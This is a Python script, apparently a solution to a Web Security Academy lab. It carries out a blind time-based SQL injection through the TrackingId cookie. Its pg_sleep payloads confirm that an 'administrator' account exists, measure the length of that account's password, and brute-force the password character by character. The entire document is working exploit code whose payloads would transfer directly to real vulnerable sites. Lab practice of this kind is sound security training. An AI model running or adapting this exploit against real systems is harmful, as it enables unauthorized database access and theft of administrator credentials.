import requests
import time

# Target URL
url = "https://YOUR-LAB-ID.web-security-academy.net"  # Replace with the actual URL of the front page

def test_tracking_id(cookie_value):
    cookies = {'TrackingId': cookie_value}
    start_time = time.time()
    response = requests.get(url, cookies=cookies)
    elapsed_time = time.time() - start_time
    return elapsed_time

# Check if the 'administrator' user exists
cookie_value_admin_check = "'||+(SELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users)--"
elapsed_time_admin = test_tracking_id(cookie_value_admin_check)

if elapsed_time_admin >= 10:
    print("User 'administrator' exists.")
else:
    print("User 'administrator' does not exist.")

# Step 1: Test the length of the administrator's password
def test_password_length(length):
    cookie_value_length_check = f"x'||+(SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>{length})+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users)--"
    elapsed_time_length = test_tracking_id(cookie_value_length_check)
    return elapsed_time_length

# Step 2: Start checking for the length of the password
password_length = 0
while True:
    elapsed_time = test_password_length(password_length)
    if elapsed_time >= 10:
        password_length += 1
    else:
        break
print("Password length:", password_length)

# Step 3: Brute force the password
def test_character(position, char):
    cookie_value_passwd = f"'||+(SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{position},1)='{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users)--"
    elapsed_time_passwd = test_tracking_id(cookie_value_passwd)
    return elapsed_time_passwd

def find_character(position, characters):
    for char in characters:
        elapsed_time = test_character(position, char)
        if elapsed_time >= 10: 
            return char
    return None

characters = 'abcdefghijklmnopqrstuvwxyz0123456789'

password = ""

for pos in range(1, password_length + 1):
    char = find_character(pos, characters)
    if char:
        password += char

print(f"Password for 'administrator': {password}")
